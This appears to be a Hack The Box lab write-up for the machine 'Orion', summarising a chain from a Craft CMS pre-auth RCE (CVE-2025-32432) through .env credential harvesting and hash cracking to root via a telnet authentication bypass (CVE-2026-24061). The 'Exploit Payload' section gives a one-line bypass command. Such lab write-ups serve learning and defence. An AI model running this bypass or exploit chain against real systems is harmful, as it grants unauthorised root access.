# Orion — HTB Machine

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Type](https://img.shields.io/badge/Type-Linux-blue)
![Status](https://img.shields.io/badge/Status-Completed-success)

A pre-auth RCE in Craft CMS leads to plaintext database credentials, a crackable admin password hash, and a legacy telnet service that hands over root through a client-trusted environment variable.

## Techniques Used

- Nmap full port + version scanning
- Virtual host discovery via `/etc/hosts`
- Directory fuzzing with ffuf
- Metasploit pre-auth RCE exploitation (CVE-2025-32432)
- Plaintext credential harvesting from `.env`
- Bcrypt hash cracking with Hashcat
- Local service enumeration
- Telnet authentication bypass (CVE-2026-24061)

## Attack Summary

```text
Nmap --> 22 (ssh), 80 (http)
80 redirects to orion.htb --> hosts file entry
ffuf --> /admin --> Craft CMS 5.6.16 login page
CVE-2025-32432 --> Metasploit --> meterpreter (www-data)
.env --> plaintext MySQL root password
DB dump --> admin bcrypt hash --> cracked via Hashcat --> adam:darkangel
su adam --> user.txt
SSH as adam --> local telnet found
CVE-2026-24061 --> telnet -f root bypass --> root shell --> root.txt
```

## Key Vulnerabilities

**CVE-2025-32432** — Pre-authentication code injection in Craft CMS allows remote code execution with no valid credentials required.

**CVE-2026-24061** — GNU inetutils telnet trusts a client-supplied `USER` environment variable for login identity; setting it to `-f root` bypasses authentication entirely.

```c
/* Conceptual vulnerable pattern */
if (getenv("USER")) {
    login_as(getenv("USER"));  // client-controlled, never validated
}
```

## Request Analysis

### Directory Discovery
```http
GET /admin HTTP/1.1
Host: orion.htb
```
```text
302 redirect --> Craft CMS admin login page
```

### Database Credential Leak
```text
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

## Exploit Payload

**Telnet auth bypass:**
```bash
USER='-f root' telnet -a 127.0.0.1
```

## Why It Works

| Factor | Explanation |
|---|---|
| Pre-auth RCE | Craft CMS executes attacker code before checking any credentials |
| Plaintext secrets | DB root password stored unencrypted in a web-readable `.env` file |
| Weak password | Admin hash cracked quickly with a common wordlist |
| Trusted client input | Telnet server trusts a client-set env var to determine login identity |

## References

- [NVD — CVE-2025-32432 (Craft CMS)](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
- [NVD — CVE-2026-24061 (GNU inetutils telnet)](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
